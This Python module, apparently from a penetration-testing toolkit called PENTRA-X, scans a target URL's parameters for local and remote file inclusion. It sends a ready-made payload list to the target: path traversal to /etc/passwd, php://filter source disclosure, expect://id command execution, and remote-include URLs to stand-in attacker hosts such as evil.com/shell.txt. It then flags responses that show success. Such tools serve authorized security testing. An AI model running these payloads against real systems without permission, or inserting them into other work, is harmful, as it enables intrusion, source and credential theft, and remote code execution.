#!/usr/bin/env python3
"""
PENTRA-X LFI/RFI Testing Module
Local File Inclusion and Remote File Inclusion testing.
"""

import requests
from typing import Optional, List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter
from ...core.spinner import ProgressBar
from ...core.logging import get_logger, log_result
from ...core.config import get_config


# LFI Payloads
LFI_PAYLOADS = [
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....\/....\/....\/etc/passwd',
    '/etc/passwd',
    '/etc/passwd%00',
    '../../../etc/passwd%00',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=../index.php',
    'php://input',
    'data://text/plain,<?php phpinfo(); ?>',
    'expect://id',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
    '/var/log/apache/access.log',
]

# RFI Payloads (test hosts)
RFI_PAYLOADS = [
    'http://evil.com/shell.txt',
    'https://pastebin.com/raw/example',
    'ftp://attacker.com/malicious.php',
]

# Indicators of successful LFI
LFI_INDICATORS = [
    'root:x:0:0',  # /etc/passwd
    '[boot loader]',  # Windows boot.ini
    'for 16-bit app support',  # Windows system.ini
    '<?php',  # PHP source
    'PD9waHA',  # base64 encoded PHP
]


def lfi_rfi_test(url: Optional[str] = None) -> Optional[List[Dict]]:
    """
    Test for Local/Remote File Inclusion vulnerabilities.
    
    Args:
        url: Target URL with file parameter
        
    Returns:
        List of found vulnerabilities or None
    """
    logger = get_logger()
    config = get_config()
    
    header("LFI/RFI Vulnerability Tester")
    
    # Get URL
    if not url:
        url = safe_input(f"{Colors.OKGREEN}Enter target URL (with file parameter): {Colors.ENDC}")
        if not url:
            return None
        url = url.strip()
    
    if not url:
        error("URL required")
        safe_press_enter()
        return None
    
    # Parse URL
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        warning("No parameters found in URL")
        info("Example: http://example.com/page.php?file=about.php")
        safe_press_enter()
        return None
    
    info(f"Found parameters: {list(params.keys())}")
    
    # Select test type
    print(f"\n{Colors.OKCYAN}Select test type:{Colors.ENDC}")
    print(f"  {Colors.OKCYAN}1.{Colors.ENDC} LFI only (Local File Inclusion)")
    print(f"  {Colors.OKCYAN}2.{Colors.ENDC} RFI only (Remote File Inclusion)")
    print(f"  {Colors.OKCYAN}3.{Colors.ENDC} Both LFI and RFI")
    print(f"  {Colors.OKCYAN}0.{Colors.ENDC} Back")
    
    choice = safe_input(f"\n{Colors.OKGREEN}Select option: {Colors.ENDC}")
    if choice is None or choice == '0':
        return None
    
    payloads = []
    if choice in ['1', '3']:
        payloads.extend(LFI_PAYLOADS)
    if choice in ['2', '3']:
        payloads.extend(RFI_PAYLOADS)
    
    if not payloads:
        payloads = LFI_PAYLOADS
    
    # Config
    user_agent = config.get('web.user_agent', 'Mozilla/5.0')
    timeout = config.get('web.timeout', 10)
    headers = {'User-Agent': user_agent}
    
    logger.tool_start("LFI/RFI Test", url)
    
    vulnerabilities = []
    total_tests = len(params) * len(payloads)
    
    progress = ProgressBar(total_tests, "Testing LFI/RFI payloads")
    
    try:
        for param_name, param_values in params.items():
            info(f"Testing parameter: {param_name}")
            
            for payload in payloads:
                progress.update()
                
                # Create test URL
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                try:
                    response = requests.get(test_url, headers=headers, timeout=timeout)
                    
                    # Check for LFI indicators
                    for indicator in LFI_INDICATORS:
                        if indicator in response.text:
                            vuln_type = 'RFI' if payload.startswith('http') else 'LFI'
                            vuln = {
                                'parameter': param_name,
                                'payload': payload,
                                'url': test_url,
                                'type': vuln_type,
                                'indicator': indicator
                            }
                            vulnerabilities.append(vuln)
                            print(f"\n{Colors.OKGREEN}[VULN] {vuln_type}: {param_name} - {payload[:40]}...{Colors.ENDC}")
                            break
                            
                except requests.Timeout:
                    pass
                except Exception:
                    pass
        
        progress.finish()
        
        # Results
        if vulnerabilities:
            success(f"Found {len(vulnerabilities)} potential LFI/RFI vulnerabilities!")
            
            print(f"\n{Colors.OKCYAN}Vulnerable Points:{Colors.ENDC}")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"  {i}. [{vuln['type']}] Parameter: {vuln['parameter']}")
                print(f"     Payload: {vuln['payload'][:60]}...")
                print()
            
            log_result("lfi_rfi_test", str(vulnerabilities))
        else:
            warning("No LFI/RFI vulnerabilities found")
        
        logger.tool_end("LFI/RFI Test", success=True)
        safe_press_enter()
        return vulnerabilities
        
    except KeyboardInterrupt:
        warning("Scan interrupted")
        logger.tool_end("LFI/RFI Test", success=False)
        safe_press_enter()
        return vulnerabilities
    except Exception as e:
        error(f"Test failed: {e}")
        logger.tool_end("LFI/RFI Test", success=False)
        safe_press_enter()
        return None


if __name__ == "__main__":
    lfi_rfi_test()
